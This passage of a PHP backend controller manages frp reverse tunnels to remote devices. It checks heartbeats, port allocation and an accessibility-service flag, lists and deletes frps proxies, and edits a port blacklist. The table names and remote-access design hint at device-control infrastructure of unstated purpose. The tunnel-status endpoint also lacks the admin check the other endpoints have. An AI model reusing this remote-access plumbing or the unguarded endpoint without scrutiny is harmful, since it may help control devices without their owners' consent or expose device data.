            'remotePortAllocated'  => $remotePortAllocated,
            'tunnelDeployed'       => $tunnelDeployed,
            'portAlive'            => $portAlive,
            'recoveryPortAlive'    => $recoveryPortAlive,
            'bridge'               => $bridgeConnected,
            'localServiceConnected' => !empty($device['local_service_connected']),
            'wsConnected'          => !empty($device['is_connected']),
            'accessibilityAlive'   => !empty($device['accessibility_alive']),
            'lastSeenMinutesAgo'   => $minutesSinceLastSeen,
            'lastSeenTimestamp'    => $lastSeen,
            'owner'                => $device['owner_username'] ?? null,
        ];

        $fatal = false;
        $error = '';

        if (!$remotePortAllocated) {
            $fatal = true;
            $error = '设备 remote_port 未分配（仍为 19901 跳板），请先调用 /api/tunnel/bootstrap';
        } elseif ($minutesSinceLastSeen !== null && $minutesSinceLastSeen > 60) {
            $fatal = true;
            $error = "设备 {$minutesSinceLastSeen} 分钟无心跳，判定离线";
        }

        return [
            'fatal'  => $fatal,
            'error'  => $error,
            'tunnel' => $tunnel,
        ];
    }

    // ================================================================
    // 管理接口（从 Node /internal/ 迁移 — 2026-08-05）
    // ================================================================

    /**
     * GET /api/tunnel/tunnel-status
     * 隧道监控完整状态（原 Node /internal/tunnel-status）
     */
    public function tunnelStatus()
    {
        // 1. 查询所有设备端口分配（★ 关键修复：不再只查 remote_port>0 的设备！
        //    否则未分配端口的设备完全不显示，前端隧道管理全0"无设备"
        //    改为：只要有设备记录就列出来，按是否分配端口排序，方便用户看见"端口未分配"的设备）
        $devices = Db::table('fisher_devices')
            ->field('device_id, remote_port, tunnel_deployed, last_seen, accessibility_alive, owner_username, is_connected, local_service_connected')
            ->order('remote_port', 'desc')
            ->order('last_seen', 'desc')
            ->select()
            ->toArray();

        // 2. 查询 frps Dashboard
        $frpsProxies = $this->fetchFrpsProxies();

        // 3. 检测 19901 跳板端口
        $springboardAlive = $this->checkPortAlive(19901, 2);

        // 4. 组合数据
        $now = time();
        $ports = [];
        foreach ($devices as $d) {
            $lastSeen = (int)($d['last_seen'] ?? 0);
            $minutesSinceLastSeen = $lastSeen > 0 ? floor(($now - $lastSeen) / 60) : null;
            $isSpringboard = (int)$d['remote_port'] === 19901;
            $expectedProxyName = $isSpringboard ? '_local' : 'tunnel_' . substr($d['device_id'], 0, 8);

            $frpsProxy = null;
            foreach ($frpsProxies as $p) {
                if (($p['name'] ?? '') === $expectedProxyName) {
                    $frpsProxy = [
                        'name' => $p['name'],
                        'status' => $p['status'] ?? '',
                        'clientVersion' => $p['client_version'] ?? '',
                        'todayTrafficIn' => $p['today_traffic_in'] ?? 0,
                        'todayTrafficOut' => $p['today_traffic_out'] ?? 0,
                        'curConns' => $p['cur_conns'] ?? 0,
                    ];
                    break;
                }
            }

            $ports[] = [
                'port' => (int)$d['remote_port'],
                'deviceId' => $d['device_id'],
                'tunnelDeployed' => (bool)$d['tunnel_deployed'],
                'lastSeen' => $lastSeen,
                'minutesSinceLastSeen' => $minutesSinceLastSeen,
                'accessibilityAlive' => (bool)($d['accessibility_alive'] ?? false),
                'owner' => $d['owner_username'] ?? null,
                'isSpringboard' => $isSpringboard,
                'frpsProxy' => $frpsProxy,
            ];
        }

        // 5. 未知 proxy（frps 上有但 DB 没对应设备）
        $knownNames = array_filter(array_column($ports, 'frpsProxy'), fn($p) => $p !== null);
        $knownProxyNames = array_column($knownNames, 'name');
        $unknownProxies = [];
        foreach ($frpsProxies as $p) {
            $name = $p['name'] ?? '';
            if ($name === '_local') continue;
            if (in_array($name, $knownProxyNames)) continue;
            $unknownProxies[] = [
                'name' => $name,
                'remotePort' => $p['conf']['remote_port'] ?? null,
                'status' => $p['status'] ?? '',
            ];
        }

        $usedPorts = count($ports);
        $totalPorts = 29999 - 19902 + 1;
        $springboardOccupant = null;
        foreach ($ports as $p) {
            if ($p['isSpringboard']) { $springboardOccupant = $p; break; }
        }

        return json([
            'timestamp' => $now,
            'springboard' => [
                'port' => 19901,
                'alive' => $springboardAlive,
                'occupied' => $springboardOccupant !== null,
            ],
            'summary' => [
                'totalPorts' => $totalPorts,
                'usedPorts' => $usedPorts,
                'freePorts' => $totalPorts - $usedPorts,
                'frpsProxyCount' => count($frpsProxies),
                'unknownProxyCount' => count($unknownProxies),
            ],
            'unknownProxies' => $unknownProxies,
            'ports' => $ports,
        ]);
    }

    /**
     * POST /api/tunnel/close-frps-proxy
     * 关闭 frps proxy（原 Node /internal/close-frps-proxy）
     */
    public function closeFrpsProxy()
    {
        if (!$this->isSuperAdmin()) {
            return json(['ok' => false, 'error' => '需要超级管理员权限'], 403);
        }

        $proxyName = Request::param('proxyName', '');
        $proxyType = Request::param('type', 'tcp');

        if (empty($proxyName)) {
            return json(['ok' => false, 'error' => 'proxyName required'], 400);
        }
        if (!preg_match('/^(tunnel_[A-Za-z0-9_-]{1,64}|_local)$/', $proxyName)) {
            return json(['ok' => false, 'error' => 'invalid proxyName'], 400);
        }
        if (!in_array($proxyType, ['tcp', 'http'], true)) {
            return json(['ok' => false, 'error' => 'invalid proxy type'], 400);
        }

        $host = env('frps.dashboard_host', '127.0.0.1');
        $port = (int)env('frps.dashboard_port', 7500);
        $user = env('frps.dashboard_user', 'admin');
        $password = env('frps.dashboard_password', '');

        $auth = base64_encode("{$user}:{$password}");
        $url = "http://{$host}:{$port}/api/proxy/{$proxyType}/" . urlencode($proxyName);

        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_CUSTOMREQUEST => 'DELETE',
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 5,
            CURLOPT_HTTPHEADER => ["Authorization: Basic {$auth}"],
        ]);
        $result = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        return json(['ok' => true, 'frps' => ['status' => $httpCode, 'body' => $result]]);
    }

    /**
     * GET|DELETE /api/tunnel/blacklist
     * 查询/清空端口释放黑名单（原 Node /internal/blacklist）
     * 黑名单存储在 node-ws/released-ports.json
     */
    public function blacklist()
    {
        if (!$this->isSuperAdmin()) {
            return json(['ok' => false, 'error' => '需要超级管理员权限'], 403);
        }

        $filePath = root_path() . '../node-ws/released-ports.json';

        if (Request::isDelete()) {
            // 清空黑名单
            $data = ['ports' => [], 'proxyNames' => [], 'updatedAt' => date('c')];
            file_put_contents($filePath, json_encode($data, JSON_PRETTY_PRINT));
            return json(['ok' => true, 'message' => 'blacklist cleared']);
        }

        // GET: 读取当前黑名单
        if (!is_file($filePath)) {
            return json(['ok' => true, 'ports' => [], 'proxyNames' => [], 'updatedAt' => null]);
        }

        $content = file_get_contents($filePath);
        $data = json_decode($content, true) ?: [];

        return json([
            'ok' => true,
            'ports' => $data['ports'] ?? [],
            'proxyNames' => $data['proxyNames'] ?? [],
            'updatedAt' => $data['updatedAt'] ?? null,
        ]);
    }

    private function isSuperAdmin(): bool
    {
        $user = $this->request->user ?? $this->request->userPayload ?? [];
        $userId = (int)($user['user_id'] ?? 0);
        if ($userId <= 0) {
            return false;
        }

        $role = Db::table('fisher_users')->where('id', $userId)->value('role');
        return in_array($role, ['superadmin', 'super-admin'], true);
    }

    // ================================================================
    // frps Dashboard API 辅助
    // ================================================================

    /**
     * 从 frps Dashboard 获取所有 proxy 列表
     */
    private function fetchFrpsProxies()
    {
        $host = env('frps.dashboard_host', '127.0.0.1');
        $port = (int)env('frps.dashboard_port', 7500);
        $user = env('frps.dashboard_user', 'admin');
        $password = env('frps.dashboard_password', '');

        $auth = base64_encode("{$user}:{$password}");
        $proxies = [];

        foreach (['tcp', 'http'] as $type) {
            $url = "http://{$host}:{$port}/api/proxy/{$type}";
            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => 5,
                CURLOPT_HTTPHEADER => ["Authorization: Basic {$auth}"],
            ]);
            $result = curl_exec($ch);
            curl_close($ch);

            if ($result) {
                $data = json_decode($result, true);
                if (isset($data['proxies']) && is_array($data['proxies'])) {
                    $proxies = array_merge($proxies, $data['proxies']);
                }
            }
        }

        return $proxies;
    }
}
